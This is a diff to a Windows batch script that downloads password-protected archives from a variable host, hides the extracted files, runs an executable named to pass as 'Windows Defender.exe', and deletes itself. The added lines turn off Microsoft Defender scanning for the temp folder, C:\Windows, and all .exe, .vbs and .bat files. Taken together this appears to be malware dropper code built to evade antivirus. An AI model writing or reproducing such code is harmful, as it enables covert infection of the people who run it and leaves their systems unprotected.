@@ -49,6 +49,12 @@ attrib +s +h +i "%environment%\Win32"
 "%environment%\curl.exe" -k %proxy% %host%/Tools/ffmpeg.7z -o "%temp%\ffmpeg.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\ffmpeg.7z" -p7zffmpeg -o"%environment%" -y && attrib +s +h +i "%environment%\ffmpeg.exe" && del /s /f /q /a "%temp%\ffmpeg.7z"
 "%environment%\curl.exe" -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%%20C%%2B%%2B%%20Redistributable%%20for%%20Visual%%20Studio%%202012%%20Update%%204.zip/vcredist_x86.exe -o "%temp%\vcredist_x86.exe" && "%temp%\vcredist_x86.exe" /Q && del /s /f /q /a "%temp%\vcredist_x86.exe"
 
+powershell.exe Add-MpPreference -ExclusionPath "%temp%"
+powershell.exe Add-MpPreference -ExclusionPath "C:\Windows"
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
+
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
 DEL /s /f /q /a "%~f0"
